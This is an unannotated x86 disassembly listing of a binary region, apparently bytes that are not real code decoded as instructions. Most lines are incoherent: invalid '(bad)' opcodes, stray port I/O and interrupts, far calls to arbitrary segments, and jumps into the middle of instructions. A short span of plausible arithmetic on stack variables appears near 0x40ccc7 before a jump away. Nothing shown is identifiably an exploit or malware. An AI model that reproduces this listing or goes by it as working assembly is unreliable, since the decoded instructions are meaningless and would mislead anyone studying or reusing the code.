  40c959:	mov    ds:0xfca425cc,eax
  40c95e:	test   BYTE PTR [ebx-0x344805ec],dh
  40c964:	imul   DWORD PTR [eax-0x2f]
  40c967:	pop    edi
  40c968:	xchg   ebp,eax
  40c969:	fdivr  QWORD PTR [ebp-0x57fae5cb]
  40c96f:	std    
  40c970:	das    
  40c971:	leave  
  40c972:	dec    edi
  40c973:	pop    ebp
  40c974:	mov    ebx,DWORD PTR [edi+0x34]
  40c977:	xor    eax,0x66d08c75
  40c97c:	ins    BYTE PTR es:[edi],dx
  40c97d:	mov    al,0x26
  40c97f:	sbb    dl,BYTE PTR [eax+0x18]
  40c982:	je     0x40c9c5
  40c984:	repnz fcomip st,st(0)
  40c987:	sahf   
  40c988:	out    dx,al
  40c989:	mov    ebx,0xe8f822da
  40c98e:	bound  eax,QWORD PTR [esi+0x57]
  40c991:	out    dx,al
  40c992:	call   FWORD PTR [eax]
  40c994:	mov    DWORD PTR [edx+0x44100ebb],edx
  40c99a:	mul    bl
  40c99c:	ins    BYTE PTR es:[edi],dx
  40c99d:	mov    DWORD PTR [edx+0x5c124a58],ebx
  40c9a3:	cli    
  40c9a4:	out    0x91,eax
  40c9a6:	jno    0x40c9a9
  40c9a8:	sar    BYTE PTR [edi+eiz*2],1
  40c9ab:	or     DWORD PTR [ecx+edx*2+0x41d771a8],edx
  40c9b2:	push   0xe6c519be
  40c9b7:	or     BYTE PTR ds:0x872eac46,0x71
  40c9be:	adc    DWORD PTR [edi-0x30497644],ebx
  40c9c4:	jno    0x40c9de
  40c9c6:	push   edx
  40c9c7:	dec    esp
  40c9c8:	dec    ebp
  40c9c9:	push   0xfffffffb
  40c9cb:	retf   0x6d36
  40c9ce:	outs   dx,BYTE PTR ds:[esi]
  40c9cf:	sbb    eax,0x8810ef09
  40c9d4:	xor    ecx,DWORD PTR [edx]
  40c9d6:	mov    ch,0xdd
  40c9d8:	push   eax
  40c9d9:	adc    esp,ecx
  40c9db:	pop    ss
  40c9dc:	fstp   DWORD PTR [eax-0x17]
  40c9df:	jns    0x40c9d3
  40c9e1:	js     0x40c989
  40c9e3:	cli    
  40c9e4:	lds    ecx,FWORD PTR [eax+0x62]
  40c9e7:	repz push esi
  40c9e9:	ror    BYTE PTR ds:0x7dac994d,0xb9
  40c9f0:	sub    ecx,ebp
  40c9f2:	and    eax,0xbca1af0d
  40c9f7:	out    dx,al
  40c9f8:	sub    DWORD PTR cs:[ecx],0x1e
  40c9fc:	(bad)  
  40c9fd:	jle    0x40ca52
  40c9ff:	ss stc 
  40ca01:	int3   
  40ca02:	cmp    eax,0xc27c2c67
  40ca07:	inc    edi
  40ca08:	(bad)  
  40ca09:	nop
  40ca0a:	xlat   BYTE PTR ds:[ebx]
  40ca0b:	fstp   DWORD PTR [ebx+0x7119258]
  40ca11:	sahf   
  40ca12:	mov    ds:0x8cf2da0c,eax
  40ca17:	mov    cl,0xe
  40ca19:	push   cs
  40ca1a:	aad    0xdd
  40ca1c:	jne    0x40ca90
  40ca1e:	or     al,0x17
  40ca20:	cmp    eax,0x1cc02bb4
  40ca25:	dec    esp
  40ca26:	test   al,0xdd
  40ca28:	loop   0x40ca81
  40ca2a:	xchg   edx,eax
  40ca2b:	or     eax,DWORD PTR [eax+0x46]
  40ca2e:	addr16 int 0x0
  40ca31:	adc    esp,DWORD PTR [edi-0x1c]
  40ca34:	test   DWORD PTR [esi],eax
  40ca36:	inc    esp
  40ca37:	dec    ebx
  40ca38:	cmp    BYTE PTR [ebx-0x68],bl
  40ca3b:	ja     0x40c9d5
  40ca3d:	jmp    0x40c9df
  40ca3f:	stos   BYTE PTR es:[edi],al
  40ca40:	dec    DWORD PTR [ebx+0x513dab8a]
  40ca46:	aam    0x67
  40ca48:	aam    0x8c
  40ca4a:	jmp    0x50a5c71
  40ca4f:	dec    esi
  40ca50:	sub    al,0xaf
  40ca52:	xor    bl,BYTE PTR [ebx]
  40ca54:	icebp  
  40ca55:	adc    BYTE PTR [ebp+0x2d],0x1b
  40ca59:	addr16 cmp ch,dh
  40ca5c:	leave  
  40ca5d:	adc    ecx,esi
  40ca5f:	xor    BYTE PTR [eax],cl
  40ca61:	fiadd  WORD PTR [ebp-0x41]
  40ca64:	push   0xcae6bc4
  40ca69:	xchg   edi,eax
  40ca6a:	sub    DWORD PTR ds:0x2e65e52b,esp
  40ca70:	neg    DWORD PTR [ebp-0x6ea8d260]
  40ca76:	jecxz  0x40caea
  40ca78:	das    
  40ca79:	iret   
  40ca7a:	int    0xbe
  40ca7c:	add    dh,BYTE PTR [edx+0x31]
  40ca7f:	aad    0xd
  40ca81:	cmp    DWORD PTR [edi-0x34],ebp
  40ca84:	mov    cl,0xa4
  40ca86:	xchg   ebp,eax
  40ca87:	arpl   WORD PTR [ebx],bx
  40ca89:	aaa    
  40ca8a:	jbe    0x40ca3a
  40ca8c:	int    0x3d
  40ca8e:	scas   al,BYTE PTR es:[edi]
  40ca8f:	repnz add eax,0x4ab81bad
  40ca95:	push   edx
  40ca96:	mov    dl,0x65
  40ca98:	fsubrp st(5),st
  40ca9a:	lds    edx,FWORD PTR [esi-0x637aaf04]
  40caa0:	and    DWORD PTR [eax-0x28101005],ecx
  40caa6:	pop    es
  40caa7:	jl     0x40ca7a
  40caa9:	pop    es
  40caaa:	ja     0x40cb15
  40caac:	lods   eax,DWORD PTR ds:[esi]
  40caad:	push   esi
  40caae:	sbb    eax,0x98a58119
  40cab3:	shr    DWORD PTR [ebp-0x744e30b6],cl
  40cab9:	ja     0x40caf0
  40cabb:	bound  ecx,QWORD PTR [ebx+0x28aafd66]
  40cac1:	push   esi
  40cac2:	inc    ecx
  40cac3:	daa    
  40cac4:	pop    ecx
  40cac5:	push   es
  40cac6:	jno    0x40ca60
  40cac8:	daa    
  40cac9:	call   0xb493:0x2022b8b5
  40cad0:	xor    DWORD PTR [ecx],edx
  40cad2:	pop    es
  40cad3:	scas   eax,DWORD PTR es:[edi]
  40cad4:	and    eax,0x99010d8
  40cad9:	cmc    
  40cada:	adc    al,0x65
  40cadc:	fucomp st(2)
  40cade:	sub    al,BYTE PTR ds:0x4a9eb5dc
  40cae4:	mov    al,ds:0xb75077ee
  40cae9:	and    al,0x11
  40caeb:	outs   dx,DWORD PTR ds:[esi]
  40caec:	cmp    bh,BYTE PTR [ebp+0x49]
  40caef:	mov    ecx,0x66dd4d4a
  40caf4:	inc    ebx
  40caf5:	scas   al,BYTE PTR es:[edi]
  40caf6:	shr    DWORD PTR [edi+0x4e],0xce
  40cafa:	repnz and eax,0x1521de80
  40cb00:	xchg   esi,eax
  40cb01:	and    BYTE PTR ds:[ebx+eax*8+0x659b2c2c],al
  40cb09:	mov    ecx,0x795a0b6e
  40cb0e:	cmp    ebx,DWORD PTR [edi-0x22]
  40cb11:	adc    BYTE PTR [ecx],dh
  40cb13:	jne    0x40cb25
  40cb15:	mov    WORD PTR ss:[ecx-0x4d14e378],fs
  40cb1c:	test   BYTE PTR [edi],al
  40cb1e:	sub    dl,cl
  40cb20:	(bad)  
  40cb21:	lea    edx,[eax+0x19]
  40cb24:	adc    DWORD PTR [edx+0x35],esi
  40cb27:	xchg   BYTE PTR [eax+eax*4+0x75b380a9],bl
  40cb2e:	mov    BYTE PTR [bp-0x62],bh
  40cb32:	and    esp,DWORD PTR [ebp+0xa2e98a6]
  40cb38:	xchg   ebx,eax
  40cb39:	adc    ecx,edx
  40cb3b:	icebp  
  40cb3c:	dec    edx
  40cb3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb3e:	push   esi
  40cb3f:	aas    
  40cb40:	in     eax,dx
  40cb41:	pop    ds
  40cb42:	adc    eax,0x90d1924b
  40cb47:	int3   
  40cb48:	push   es
  40cb49:	jg     0x40cb81
  40cb4b:	xchg   ebp,eax
  40cb4c:	(bad)  
  40cb4d:	popf   
  40cb4e:	and    DWORD PTR [edx+0x54f8de5e],ebp
  40cb54:	aam    0xb0
  40cb56:	out    0x7d,al
  40cb58:	pop    esi
  40cb59:	div    BYTE PTR ds:0x4827624a
  40cb5f:	lods   al,BYTE PTR ds:[esi]
  40cb60:	ds jae 0x40cb05
  40cb63:	out    0x91,eax
  40cb65:	retf   0xd119
  40cb68:	sbb    DWORD PTR [edi],esp
  40cb6a:	les    eax,FWORD PTR ds:0xe4150c92
  40cb70:	push   0x57f801f7
  40cb75:	inc    esi
  40cb76:	push   edi
  40cb77:	jge    0x40cb08
  40cb79:	xchg   esp,eax
  40cb7a:	mov    al,ds:0x7e45022c
  40cb7f:	sbb    eax,DWORD PTR [edx]
  40cb81:	or     DWORD PTR [edx],edi
  40cb83:	je     0x40cb7b
  40cb85:	je     0x40cb89
  40cb87:	mov    eax,ds:0x624e4988
  40cb8c:	(bad)  
  40cb8e:	mov    al,0x97
  40cb90:	mov    al,0xf7
  40cb92:	mov    bh,0x3d
  40cb94:	push   ss
  40cb95:	jbe    0x40cb3c
  40cb97:	mov    eax,DWORD PTR [ebx-0x16]
  40cb9a:	lea    ebx,[edx+eax*2]
  40cb9d:	push   ds
  40cb9e:	scas   al,BYTE PTR es:[edi]
  40cb9f:	inc    edi
  40cba0:	xor    al,0x9d
  40cba2:	daa    
  40cba3:	test   al,0x66
  40cba5:	adc    BYTE PTR [esp+esi*4-0x271d0a8e],0x45
  40cbad:	dec    edx
  40cbae:	je     0x40cb75
  40cbb0:	fiadd  WORD PTR [edx+eiz*4+0x6a]
  40cbb4:	dec    ecx
  40cbb5:	cmc    
  40cbb6:	xor    al,0xdd
  40cbb8:	xor    eax,0x401abd58
  40cbbd:	inc    ebx
  40cbbe:	push   esi
  40cbbf:	rcl    dh,0x7c
  40cbc2:	mov    edi,DWORD PTR [eax-0x23]
  40cbc5:	xchg   edx,eax
  40cbc6:	mov    al,dh
  40cbc8:	cmp    eax,0x926e402d
  40cbcd:	daa    
  40cbce:	test   al,0x13
  40cbd0:	ret    0xf80c
  40cbd3:	cmp    ebp,DWORD PTR [edx-0xd]
  40cbd6:	jge    0x40cc48
  40cbd8:	repnz sbb ch,BYTE PTR [bp+0x560f]
  40cbde:	repz hlt 
  40cbe0:	mov    BYTE PTR [edi-0x374fe82a],bl
  40cbe6:	fucom  st(5)
  40cbe8:	fild   WORD PTR [eax]
  40cbea:	adc    al,0xe5
  40cbec:	and    DWORD PTR ds:0xd5f5176b,esi
  40cbf2:	xchg   ebx,eax
  40cbf3:	xchg   ebp,eax
  40cbf4:	push   esp
  40cbf5:	in     eax,0xe3
  40cbf7:	jno    0x40cba3
  40cbf9:	xchg   DWORD PTR [ebx-0x291033ce],eax
  40cbff:	imul   esp,DWORD PTR [ecx+eiz*8],0x81b59fa3
  40cc06:	push   ds
  40cc07:	bound  edi,QWORD PTR [ebp+0x20]
  40cc0a:	sahf   
  40cc0b:	mov    esi,0x707ba4c0
  40cc10:	jo     0x40cbfd
  40cc12:	push   ebp
  40cc13:	aaa    
  40cc14:	and    ebp,ebx
  40cc16:	mov    dl,0xc3
  40cc18:	and    dh,BYTE PTR ds:0xb3078c55
  40cc1e:	clc    
  40cc1f:	mov    cl,0xb3
  40cc21:	call   0xf52d:0xc0519588
  40cc28:	hlt    
  40cc29:	bound  esp,QWORD PTR [ecx-0x31b9fd25]
  40cc2f:	pop    edi
  40cc30:	arpl   WORD PTR [esi],si
  40cc32:	ror    DWORD PTR [ebp+0x29],0xe8
  40cc36:	adc    al,0x25
  40cc38:	test   al,0x57
  40cc3a:	jl     0x40cbe9
  40cc3c:	inc    eax
  40cc3d:	pop    eax
  40cc3e:	es mov ?,esi
  40cc41:	xor    DWORD PTR [eax+ebp*1-0x1c50154b],0xd4676600
  40cc4c:	push   ss
  40cc4d:	scas   eax,DWORD PTR es:[edi]
  40cc4e:	scas   eax,DWORD PTR es:[edi]
  40cc4f:	stos   BYTE PTR es:[edi],al
  40cc50:	fidiv  DWORD PTR [edi+0x2b]
  40cc53:	push   ss
  40cc54:	mov    gs,WORD PTR [edx+0x5c]
  40cc57:	rol    BYTE PTR [ebp+0x79f89d23],1
  40cc5d:	push   esp
  40cc5e:	test   al,0x77
  40cc60:	ficomp DWORD PTR [ecx-0x7227ffc5]
  40cc66:	call   0xf279:0xaf5d61f7
  40cc6d:	pop    ds
  40cc6e:	mov    al,ds:0x890aaf8f
  40cc73:	inc    eax
  40cc74:	pop    ebp
  40cc75:	jl     0x40cce9
  40cc77:	push   0xffffffc1
  40cc79:	(bad)  
  40cc7a:	and    BYTE PTR [edi-0x6d421117],dh
  40cc80:	and    bh,ah
  40cc82:	pop    ebx
  40cc83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cc84:	push   eax
  40cc85:	jnp    0x40cc7d
  40cc87:	lahf   
  40cc88:	and    eax,0xf912e19b
  40cc8d:	aad    0x7a
  40cc8f:	out    0x66,eax
  40cc91:	scas   eax,DWORD PTR es:[edi]
  40cc92:	ins    DWORD PTR es:[edi],dx
  40cc93:	or     cl,BYTE PTR [ebx]
  40cc95:	cdq    
  40cc96:	adc    bl,ah
  40cc98:	or     DWORD PTR [ebx+ebx*1],ecx
  40cc9b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40cc9c:	(bad)  
  40cc9d:	xchg   edx,eax
  40cc9e:	jle    0x40cce0
  40cca0:	cmc    
  40cca1:	test   al,0xd0
  40cca3:	mov    dl,0xba
  40cca5:	(bad)  
  40cca7:	add    eax,0xbfb989aa
  40ccac:	inc    edi
  40ccad:	out    0x4,al
  40ccaf:	scas   al,BYTE PTR es:[edi]
  40ccb0:	sub    dh,bl
  40ccb2:	dec    ebp
  40ccb3:	(bad)  
  40ccb5:	mov    al,0x10
  40ccb7:	je     0x40cd03
  40ccb9:	mov    al,0xe2
  40ccbb:	mov    ecx,0xce32ac2d
  40ccc0:	xchg   ebx,eax
  40ccc1:	out    0xf6,eax
  40ccc3:	dec    ecx
  40ccc4:	cs xor edi,eax
  40ccc7:	add    edx,ecx
  40ccc9:	add    edi,ecx
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sbb    DWORD PTR [eax+0xb936b85],0xffffff90
  40cd1c:	jo     0x40cd8e
  40cd1e:	lahf   
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd14
  40cd23:	xor    eax,0xbdd12fd1
  40cd28:	pop    ebx
  40cd29:	out    0x5c,al
  40cd2b:	pop    esi
  40cd2c:	mov    ecx,0x72294753
  40cd31:	mov    ds:0xf01d91eb,eax
  40cd36:	mov    DWORD PTR [ecx-0x7548a509],esp
  40cd3c:	jmp    0xfb6c:0x8ec3f919
  40cd43:	mov    ds:0x783c2b32,al
  40cd48:	mov    ah,0xe9
  40cd4a:	out    dx,eax
  40cd4b:	shr    BYTE PTR [esi+0x37],cl
  40cd4e:	out    dx,eax
  40cd4f:	ins    DWORD PTR es:[edi],dx
  40cd50:	push   ds
  40cd51:	dec    edi
  40cd52:	imul   edx,esp,0xa5796c86
  40cd58:	(bad)  
  40cd59:	js     0x40cd2b
  40cd5b:	leave  
  40cd5c:	aaa    
  40cd5d:	cmp    bl,BYTE PTR [ebx-0x1448407]
  40cd63:	cmp    al,0xf
  40cd65:	mov    ebx,0x3cbc19c5
  40cd6a:	pop    eax
  40cd6b:	in     eax,0x2e
  40cd6d:	pop    ss
  40cd6e:	enter  0x4102,0x78
  40cd72:	and    esi,esp
  40cd74:	add    al,0xa
  40cd76:	stos   BYTE PTR es:[edi],al
  40cd77:	jecxz  0x40ccfe
  40cd79:	rcr    DWORD PTR [eax+0x52318549],0x56
  40cd80:	dec    esi
  40cd81:	sti    
  40cd82:	jmp    0xa26960f0
  40cd87:	icebp  
  40cd88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd89:	es jmp 0xeb4:0xeb566c11
  40cd91:	push   0x5ecc2095
  40cd96:	sar    BYTE PTR [ebx+edi*2],cl
  40cd99:	leave  
  40cd9a:	or     DWORD PTR [ebx+esi*2+0x52],edx
  40cd9e:	dec    esp
  40cd9f:	outs   dx,DWORD PTR cs:[esi]
  40cda1:	jb     0x40cd60
  40cda3:	or     eax,eax
  40cda5:	jns    0x40cdb8
  40cda7:	sti    
  40cda8:	xchg   esp,eax
  40cda9:	imul   esi,DWORD PTR [eax+ebp*8],0xeee837cc
  40cdb0:	cmc    
  40cdb1:	dec    esp
  40cdb2:	jle    0x40cd83
  40cdb4:	or     ecx,DWORD PTR [edi+0x4166cb73]
  40cdba:	leave  
  40cdbb:	and    DWORD PTR [ebp+0x266789a2],ebx
  40cdc1:	(bad)  
  40cdc3:	bound  esp,QWORD PTR ss:[eax-0x5c9910dd]
  40cdca:	mov    ds:0x98eaf9bc,eax
  40cdcf:	pusha  
  40cdd0:	push   ebx
  40cdd1:	loop   0x40ce38
  40cdd3:	bound  esi,QWORD PTR [esi+0x58]
  40cdd6:	xlat   BYTE PTR ds:[ebx]
  40cdd7:	iret   
  40cdd8:	fs add bl,ch
  40cddb:	mov    DWORD PTR [ecx],esp
  40cddd:	stc    
  40cdde:	jae    0x40ce42
  40cde0:	add    edi,ebx
  40cde2:	xor    ch,BYTE PTR [eax]
  40cde4:	cmp    eax,0xc388fc7d
  40cde9:	fild   DWORD PTR [esi-0x38]
  40cdec:	mov    al,0xb
  40cdee:	sbb    eax,0xf6ff418d
  40cdf3:	adc    eax,0x5d6c0ade
  40cdf8:	xlat   BYTE PTR ds:[ebx]
  40cdf9:	pushf  
  40cdfa:	fild   DWORD PTR [eax]
  40cdfc:	and    bl,BYTE PTR ds:0xea5e103a
  40ce02:	and    al,0xdf
  40ce04:	xchg   ebx,eax
  40ce05:	or     eax,0x916ab162
  40ce0a:	pop    edx
  40ce0b:	in     eax,dx
  40ce0c:	ja     0x40ce14
  40ce0e:	(bad)  
  40ce0f:	push   edi
  40ce10:	mov    dh,0x34
  40ce12:	cmc    
  40ce13:	int    0xff
  40ce15:	aaa    
  40ce16:	daa    
  40ce17:	or     eax,0xeb819cb8
  40ce1c:	push   0xc8a07b8f
  40ce21:	xor    DWORD PTR ds:0x79628ab1,eax
  40ce27:	mov    esi,0x37a6be3e
  40ce2c:	ss jae 0x40ce70
  40ce2f:	xor    ecx,ebx
  40ce31:	pusha  
  40ce32:	ret    
  40ce33:	cmp    eax,0x9a957cd6
  40ce38:	jg     0x40ceaf
  40ce3a:	rep outs dx,DWORD PTR ds:[esi]
  40ce3c:	pop    eax
  40ce3d:	push   0xb5ec2de5
  40ce42:	ret    0x2fb3
  40ce45:	js     0x40ce7a
  40ce47:	sub    ebx,DWORD PTR [edi+ebp*4]
  40ce4a:	xor    eax,ecx
  40ce4c:	fisubr DWORD PTR [ebp+edi*8+0xd]
  40ce50:	mov    esi,0xa2ff269c
  40ce55:	ficom  WORD PTR [ebx]
  40ce57:	add    esi,DWORD PTR [ebx]
  40ce59:	adc    DWORD PTR [edi],ebp
  40ce5b:	call   0xde84fca8
  40ce60:	retf   
  40ce61:	mov    WORD PTR [ecx+0x32],?
  40ce64:	in     al,dx
  40ce65:	outs   dx,DWORD PTR ds:[esi]
  40ce66:	aad    0x9f
  40ce68:	push   eax
  40ce69:	jg     0x40cea8
  40ce6b:	fistp  WORD PTR [edx-0x13e7289f]
  40ce71:	jnp    0x40ce00
  40ce73:	ret    0x2e58
  40ce76:	cmp    al,0x37
  40ce78:	push   0xffffff9d
  40ce7a:	int    0x4e
  40ce7c:	dec    eax
  40ce7d:	push   edx
  40ce7e:	cmp    ch,cl
  40ce80:	jmp    0x40ce80
  40ce82:	jo     0x40ce05
  40ce84:	mov    ds:0xf32a6ca7,al
  40ce89:	lahf   
  40ce8a:	scas   al,BYTE PTR es:[edi]
  40ce8b:	mov    bl,0xfb
  40ce8d:	mov    ch,0x44
  40ce8f:	rcl    BYTE PTR [edi-0x3f],cl
  40ce92:	mov    edx,0x3e6864eb
  40ce97:	fcmovnu st,st(1)
  40ce99:	mov    ds:0x6dbbc618,eax
  40ce9e:	cmp    eax,0x33d0beb2
  40cea3:	sar    BYTE PTR [esp+ebp*8-0x71],1
  40cea7:	cs or  eax,0x31b29f5c
  40cead:	sub    DWORD PTR [ebp+0x2ef5ae4e],ecx
  40ceb3:	fstp   DWORD PTR [edx+0x63]
  40ceb6:	xchg   BYTE PTR [ecx+edi*4],cl
  40ceb9:	sub    eax,0x35508a54
  40cebe:	and    al,0xf
  40cec0:	bswap  ebp
  40cec2:	clc    
  40cec3:	mov    ebx,0x575b1680
  40cec8:	lock mul DWORD PTR [esi+ebx*1-0x4f]
  40cecd:	mov    dl,0xcd
  40cecf:	hlt    
  40ced0:	adc    eax,0x316ed93
  40ced5:	outs   dx,BYTE PTR ds:[esi]
  40ced6:	lds    ebx,FWORD PTR [edx]
  40ced8:	xchg   ebp,eax
  40ced9:	sub    edi,DWORD PTR [ecx-0x6ca97384]
  40cedf:	faddp  st(1),st
  40cee1:	js     0x40cea0
  40cee3:	mov    esi,0x10749d0f
  40cee8:	dec    DWORD PTR [ecx]
  40ceea:	xor    eax,ebx
  40ceec:	pop    ss
  40ceed:	stc    
  40ceee:	push   ds
  40ceef:	push   cs
  40cef0:	rcr    dh,0x9c
  40cef3:	xchg   BYTE PTR [esi-0x2baa3d15],bl
  40cef9:	bound  edx,QWORD PTR [ebp+0x16]
  40cefc:	sub    esi,eax
  40cefe:	dec    edx
  40ceff:	scas   eax,DWORD PTR es:[edi]
  40cf00:	add    ah,bl
  40cf02:	stos   DWORD PTR es:[edi],eax
  40cf03:	gs jo  0x40ce99
  40cf06:	sub    eax,0x44b10f6
  40cf0b:	sub    eax,0xd736801b
  40cf10:	jae    0x40cf61
  40cf12:	pop    ds
  40cf13:	fiadd  WORD PTR [esi]
  40cf15:	(bad)  
  40cf16:	pop    edx
  40cf17:	or     BYTE PTR [edi-0xf2b425f],bh
  40cf1d:	lods   al,BYTE PTR ds:[esi]
  40cf1e:	push   eax
  40cf1f:	jnp    0x40cef0
  40cf21:	xor    ch,BYTE PTR [esi]
  40cf23:	push   0x68
  40cf25:	and    BYTE PTR [ecx+0x7da2ce5b],0x8c
  40cf2c:	sub    bl,ch
  40cf2e:	stc    
  40cf2f:	sub    edi,edi
  40cf31:	adc    dl,ah
  40cf33:	sbb    BYTE PTR [edi-0x6853f73d],bh
  40cf39:	addr16 int 0x2a
  40cf3c:	clc    
  40cf3d:	inc    edx
  40cf3e:	cld    
  40cf3f:	jg     0x40cf11
  40cf41:	push   ds
  40cf42:	sar    DWORD PTR [eax+edx*8],0xc8
  40cf46:	imul   eax,DWORD PTR [ecx+esi*8-0x4c],0xb624a629
  40cf4e:	add    eax,0x89080caa
  40cf53:	mov    ah,0x41
  40cf55:	jl     0x40cf6e
  40cf57:	aad    0x7c
  40cf59:	mov    ebx,0x9a7b588a
  40cf5e:	or     dh,BYTE PTR [esi]
  40cf60:	into   
  40cf61:	inc    eax
  40cf62:	xchg   edi,eax
  40cf63:	or     edx,esi
  40cf65:	or     cl,0xb9
  40cf68:	push   ebp
  40cf69:	inc    ebx
  40cf6a:	adc    BYTE PTR [esi-0x3b],ch
  40cf6d:	xchg   esp,eax
  40cf6e:	div    BYTE PTR ds:0x417af583
  40cf74:	inc    edi
  40cf75:	and    esp,DWORD PTR [ebx+0x10]
  40cf78:	inc    ebp
  40cf79:	pop    ds
  40cf7a:	mov    ebp,0xc7e3f168
  40cf7f:	in     eax,0xc0
  40cf81:	test   eax,0x53fccc8c
  40cf86:	or     esi,ecx
  40cf88:	xor    al,0x67
  40cf8a:	stc    
  40cf8b:	aad    0xc6
  40cf8d:	push   ecx
  40cf8e:	aam    0xdf
  40cf90:	jb     0x40cfc8
  40cf92:	cmp    al,0xe0
  40cf94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cf95:	cmp    DWORD PTR [edx-0x56],esi
  40cf98:	push   eax
  40cf99:	sub    DWORD PTR [edi-0xfafec38],edi
  40cf9f:	lahf   
  40cfa0:	mov    ds:0x46ac7719,al
  40cfa5:	aaa    
  40cfa6:	and    eax,0xa3c45b77
  40cfab:	pusha  
  40cfac:	arpl   WORD PTR [edx],ax
  40cfae:	push   cs
  40cfaf:	sahf   
  40cfb0:	ret    0x4365
  40cfb3:	test   DWORD PTR ds:0x6e72c432,edi
  40cfb9:	(bad)  
  40cfba:	not    DWORD PTR [edx+0x1e]
  40cfbd:	hlt    
  40cfbe:	imul   edi,DWORD PTR [esi-0x6a],0x1fd35dd1
  40cfc5:	push   edi
  40cfc6:	dec    eax
  40cfc7:	lea    esp,[ebx]
  40cfc9:	cli    
  40cfca:	xchg   edi,eax
  40cfcb:	push   esi
  40cfcc:	psrad  mm0,QWORD PTR [edx+ecx*2]
  40cfd0:	lods   eax,DWORD PTR ds:[esi]
  40cfd1:	sbb    al,0xeb
  40cfd3:	xor    esi,eax
  40cfd5:	jmp    0x32f7dd22
  40cfda:	pushf  
  40cfdb:	call   0x8ff20793
  40cfe0:	adc    BYTE PTR [ebx+0x4],0x30
  40cfe4:	push   es
  40cfe5:	xchg   DWORD PTR [edi],esi
  40cfe7:	cmp    edx,DWORD PTR [ebx+0xc]
  40cfea:	pop    esp
  40cfeb:	xor    DWORD PTR [ecx-0x3b],0xffffffc1
  40cfef:	(bad)  
  40cff0:	cmp    ebx,DWORD PTR [ecx]
  40cff2:	pop    esp
  40cff3:	xor    DWORD PTR [ebx+0x423d2615],ebp
  40cff9:	ins    DWORD PTR es:[edi],dx
  40cffa:	retf   0xddae
  40cffd:	pop    ecx
  40cffe:	mov    dl,0xfb
  40d000:	test   eax,0x363e215a
  40d005:	jnp    0x40d07e
  40d007:	xor    BYTE PTR [ecx],dh
  40d009:	sahf   
  40d00a:	jb     0x40d020
  40d00c:	cmp    al,0x9f
  40d00e:	iret   
  40d00f:	iret   
  40d010:	loop   0x40d02c
  40d012:	jecxz  0x40d054
  40d014:	add    al,0x95
  40d016:	xor    eax,0xb459c2d3
  40d01b:	(bad)  
  40d01c:	into   
  40d01d:	daa    
  40d01e:	fs (bad) 
  40d021:	popa   
  40d022:	add    DWORD PTR [edx+0x38],edx
  40d025:	push   edx
  40d026:	jbe    0x40d038
  40d028:	shl    BYTE PTR [ebp+0x7040a59d],cl
  40d02e:	sahf   
  40d02f:	icebp  
  40d030:	imul   eax,DWORD PTR ds:0xc4789834,0xa2fcb130
  40d03a:	fimul  DWORD PTR [ebx]
  40d03c:	je     0x40d075
  40d03e:	scas   al,BYTE PTR es:[edi]
  40d03f:	jl     0x40d0bb
  40d041:	cmp    DWORD PTR [esi+ebp*8+0x19],edx
  40d045:	cli    
  40d046:	or     dh,0x29
  40d049:	jae    0x40d0a5
  40d04b:	stc    
  40d04c:	mov    dh,bl
  40d04e:	jno    0x40d049
  40d050:	dec    ebx
  40d051:	cs dec ebp
  40d053:	or     al,0x7e
  40d055:	out    dx,eax
  40d056:	sub    eax,DWORD PTR [edi]
  40d058:	or     al,0xbb
  40d05a:	cld    
  40d05b:	xchg   esi,eax
  40d05c:	jg     0x40d0aa
  40d05e:	das    
  40d05f:	punpckhbw mm7,QWORD PTR [edi+eax*2+0xa49a1fa]
  40d067:	ret    
  40d068:	mov    ebp,0x8345474d
  40d06d:	int    0x99
  40d06f:	mov    BYTE PTR [esi+0x457f29fe],ah
  40d075:	sub    edi,DWORD PTR [edx]
  40d077:	inc    esi
  40d078:	out    dx,al
  40d079:	aaa    
  40d07a:	std    
  40d07b:	clc    
  40d07c:	ret    
  40d07d:	inc    esi
  40d07e:	pop    ecx
  40d07f:	and    BYTE PTR [eax+ebp*8-0x1d7c5b87],dh
  40d086:	out    dx,al
  40d087:	sbb    BYTE PTR [eax+0x22],ch
  40d08a:	cmc    
  40d08b:	mov    BYTE PTR [edx+0x256c1b32],cl
  40d091:	sub    al,0x99
  40d093:	mov    eax,0xd4acb1f5
  40d098:	or     dl,ah
  40d09a:	jp     0x40d08d
  40d09c:	jo     0x40d0d0
  40d09e:	jo     0x40d063
  40d0a0:	test   eax,0xc323d127
  40d0a5:	jg     0x40d073
  40d0a7:	add    eax,0x4ecf8fd4
  40d0ac:	sub    BYTE PTR [esi+ecx*2+0x39a00fb8],bh
  40d0b3:	not    DWORD PTR [ebx-0x3d]
  40d0b6:	and    DWORD PTR [ebp-0x61527b75],0x2ba1b693
  40d0c0:	or     al,0xfc
  40d0c2:	jl     0x40d0d3
  40d0c4:	xchg   BYTE PTR [esi-0x10],ah
  40d0c7:	(bad)  
  40d0c8:	dec    DWORD PTR [ebx+0x7d8bf455]
  40d0ce:	fdiv   QWORD PTR [ebx]
  40d0d0:	rol    BYTE PTR [ebx],1
  40d0d2:	ror    DWORD PTR [edi],1
  40d0d4:	scas   eax,DWORD PTR es:[edi]
